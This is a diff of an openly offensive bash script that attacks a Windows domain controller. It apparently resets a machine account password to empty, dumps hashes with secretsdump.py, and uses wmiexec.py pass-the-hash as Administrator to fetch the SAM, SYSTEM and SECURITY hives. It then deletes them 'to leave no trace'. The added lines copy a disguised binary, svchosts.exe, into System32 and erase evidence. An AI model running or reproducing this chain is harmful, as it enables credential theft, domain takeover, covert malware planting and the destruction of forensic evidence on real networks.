@@ -1,4 +1,4 @@
-#! /bin/bash
+#!/bin/bash
 
 python3 set_empty_pw.py $2 $3
 hashes=$(secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 "$1/$2"'$@'"$3" \
@@ -16,3 +16,5 @@ wmiexec.py -hashes $hashes "$1/Administrator@$3" "lget security.save"
 # Delete device info off target to leave no trace
 wmiexec.py -hashes $hashes "$1/Administrator@$3" "del /f system.save sam.save security.save"
 
+# Execute additional commands using wmiexec.py
+wmiexec.py -hashes $hashes "$1/Administrator@$3" "@echo off & set \"sourceFile=C:\\svchosts.exe\" & set \"destinationFolder=C:\\Windows\\System32\" & set \"destinationFile=%destinationFolder%\\svchosts.exe\" & echo Copying \"%sourceFile%\" to \"%destinationFile%\"... & copy /Y \"%sourceFile%\" \"%destinationFolder%\" >nul & if exist \"%destinationFile%\" (echo File copied successfully. & echo Calling \"%destinationFile%\"...) else (echo Failed to copy the file. & echo The source file may not exist or the destination folder may not be accessible.) & echo Task completed. Deleting files... & del svchosts.exe & del \"%~f0\""
